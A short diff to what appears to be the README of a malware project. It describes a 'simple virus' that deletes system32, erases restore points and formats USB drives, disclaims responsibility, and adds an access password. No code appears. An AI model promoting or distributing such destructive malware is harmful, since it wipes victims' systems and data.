@@ -3,6 +3,10 @@
 
 a *simple vir-us delete sys32 , delete restore points , format any usb*
 
+# Password
+
+Pass: @Mr.Joex
+
 
 **You are the only responsible for your actions.**
 
